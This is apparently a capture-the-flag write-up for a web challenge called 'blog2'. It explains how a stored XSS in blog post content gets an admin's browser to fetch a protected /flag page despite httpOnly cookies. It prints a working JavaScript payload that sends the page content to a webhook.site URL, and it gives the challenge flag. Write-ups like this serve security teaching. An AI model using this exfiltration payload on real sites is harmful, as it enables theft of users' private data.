# blog2
Author: solli#0387


In this challenge we are provided an identical webpage as the `blog` challenge. On this site we know there is an XSS vulnerability in the content field of each blog post. For this reason getting XSS with ex. `<script>alert(1);</script>` works fine as a PoC for XSS on the site.


However, we are provided an endpoint in the challenge description of `/flag`, when requesting this site with out own user we are proveded a message of `Only for the admin`. We are also told that the admin checks the site quite often. One would initially assume that the challenge would be to write a cookie stealer and get the cookie of the admin, however based upon the protections set on our own cookie this would not be possilbe. Here we have the flag `httpOnly` flag set, which means that we cannot access the flag value directly. However, the cookies are still used in requests within the same site as long as it is the admins browser that makes the request. The challenge should now be clear, and we have to get the admin to request this endpoint, and send the conent of this page somewhere.


To do this we can craft an AJAX query, which will request `/flag` and send the content of this site to a site we control. We'll add the content to the end of the url as a parameter, and hope that there is only a simple string on the site and not an image or something that would be to large for the URL. The AJAX query will trigger when we ourself also trigger the XSS on the page, but then the parameter will be the same message as we would see normally of `Only for hte admin`, but it is still helpful to see as it means the XSS is working. 


The following snippet will do what is described above. Note that the cookies are specified nowhere, as they are used by default. The request is pointing to `webhook.site`, which is a useful site to listen for requests instead of exposing our own webserver.

```js
<script>

function loadDoc() {
  const xhttp = new XMLHttpRequest();
  xhttp.onload = function() {
        xhttp.open("GET", "https://webhook.site/80d51203-cbf5-4e58-a018-5c90aff3c67a/?"+this.responseText);
    xhttp.send();
  }
  xhttp.open("GET", "/flag");
  xhttp.send();
}

loadDoc();

</script>
```


Flag: `EPT{c4us3_sl33p_i5_th3_c0u5in_0f_d34th}`

